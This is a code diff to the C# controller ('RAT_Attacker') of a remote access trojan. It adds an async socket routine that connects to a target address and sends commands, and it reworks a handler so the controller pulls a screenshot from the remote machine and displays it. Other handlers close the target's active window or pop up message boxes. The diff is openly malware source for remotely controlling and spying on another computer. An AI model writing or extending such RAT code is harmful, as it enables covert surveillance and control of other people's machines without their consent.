@@ -1,9 +1,13 @@
-﻿using RAT_Library;
+﻿using System;
+using System.CodeDom;
+using RAT_Library;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Threading;
+using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Input;
 using System.Windows.Media.Imaging;
@@ -46,6 +50,34 @@ namespace RAT_Attacker
             }, null);
         }
 
+        private async Task<byte[]> SendCommandAndGetDataAsync(RatCommand command)
+        {
+            IsEnabled = false;
+            var buffer = new byte[Common.BufferSize];
+            _client = new Socket(SocketType.Stream, ProtocolType.Tcp);
+            try
+            {
+                await _client.ConnectAsync(new IPEndPoint(IPAddress.Parse(AddressTextBox.Text), Common.Port));
+                _client.Send(new[] { (byte)command });
+                _client.Receive(buffer);
+                return buffer;
+            }
+            catch (SocketException ex)
+            {
+                if (ex.SocketErrorCode == SocketError.ConnectionRefused)
+                {
+                    Dispatcher.Invoke(() =>
+                        MessageBox.Show("Cannot connect", "Error", MessageBoxButton.OK, MessageBoxImage.Error));
+                }
+            }
+            finally
+            {
+                Dispatcher.Invoke(() => IsEnabled = true);
+            }
+
+            return null;
+        }
+
         private void CloseActiveWindow(object sender, RoutedEventArgs e)
         {
             SendCommand(RatCommand.CloseActiveWindow);
@@ -56,16 +88,14 @@ namespace RAT_Attacker
             SendCommand(RatCommand.ShowMessageBox);
         }
 
-        private void TakeScreenshot(object sender, RoutedEventArgs e)
+        private async void TakeScreenshot(object sender, RoutedEventArgs e)
         {
-            SendCommand(RatCommand.TakeScreenshot);
-
-            var buffer = new byte[Common.BufferSize];
-            _client.Receive(buffer);
+            var data = await SendCommandAndGetDataAsync(RatCommand.TakeScreenshot);
+            if (data == null) return;
 
             var bitmapImage = new BitmapImage();
             bitmapImage.BeginInit();
-            bitmapImage.StreamSource = new MemoryStream(buffer);
+            bitmapImage.StreamSource = new MemoryStream(data);
             bitmapImage.EndInit();
 
             ScreenshotImage.Source = bitmapImage;
